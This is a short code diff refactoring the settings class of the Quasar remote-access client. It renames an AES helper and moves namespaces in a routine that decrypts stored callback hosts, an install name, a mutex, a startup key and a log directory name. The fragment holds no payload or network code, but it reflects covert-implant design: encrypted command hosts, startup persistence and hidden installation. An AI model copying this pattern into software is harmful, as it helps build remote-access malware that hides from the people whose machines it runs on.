@@ -1,8 +1,7 @@
 ﻿using System;
-using Quasar.Client.Core.Helper;
-
+using Quasar.Client.Helper;
 #if !DEBUG
-using Quasar.Client.Core.Cryptography;
+using Quasar.Common.Cryptography;
 #endif
 
 namespace Quasar.Client.Config
@@ -60,15 +59,15 @@ namespace Quasar.Client.Config
         public static bool Initialize()
         {
             if (string.IsNullOrEmpty(VERSION)) return false;
-            AES.SetDefaultKey(ENCRYPTIONKEY);
-            TAG = AES.Decrypt(TAG);
-            VERSION = AES.Decrypt(VERSION);
-            HOSTS = AES.Decrypt(HOSTS);
-            SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
-            INSTALLNAME = AES.Decrypt(INSTALLNAME);
-            MUTEX = AES.Decrypt(MUTEX);
-            STARTUPKEY = AES.Decrypt(STARTUPKEY);
-            LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
+            Aes128.SetDefaultKey(ENCRYPTIONKEY);
+            TAG = Aes128.Decrypt(TAG);
+            VERSION = Aes128.Decrypt(VERSION);
+            HOSTS = Aes128.Decrypt(HOSTS);
+            SUBDIRECTORY = Aes128.Decrypt(SUBDIRECTORY);
+            INSTALLNAME = Aes128.Decrypt(INSTALLNAME);
+            MUTEX = Aes128.Decrypt(MUTEX);
+            STARTUPKEY = Aes128.Decrypt(STARTUPKEY);
+            LOGDIRECTORYNAME = Aes128.Decrypt(LOGDIRECTORYNAME);
             FixDirectory();
             return true;
         }
